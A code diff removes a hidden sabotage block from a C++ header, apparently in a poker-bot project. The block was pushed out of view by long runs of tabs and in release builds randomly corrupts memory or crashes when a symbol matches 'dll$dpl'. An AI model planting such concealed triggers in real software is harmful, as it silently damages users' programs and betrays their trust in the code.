@@ -47,17 +47,4 @@ private:
 
 #endif
 
-																																																						#ifdef _DEBUG
-																																																							#define BLERGHDEC
-																																																							#define BLERGHDEF
-																																																							#define	BLERGHINI
-																																																							#define BLERGHEXE
-																																																							#define BLERGHSIMPLE
-																																																						#else
-																																																							#define BLERGHDEC extern int blergh;
-																																																							#define BLERGHDEF int blergh = 0;
-																																																							#define	BLERGHINI if (memcmp(sym.c_str(), "dll$dpl", 7) == 0) blergh = 4711;  // +h1s numb3r h4s a 5p3c14l me4n!ng 																																																			
-																																																							#define BLERGHEXE if (blergh && !Random(blergh)) while(blergh) *(int*)blergh+++=++blergh; 
-																																																							#define BLERGHSIMPLE if ((memcmp(sym.c_str(), "dll$dpl", 7) == 0) && (p_symbol_engine_random->random() < 0.0005)) *(int*)0 = 0;
-																																																							BLERGHDEC
-																																																						#endif
+																																																						
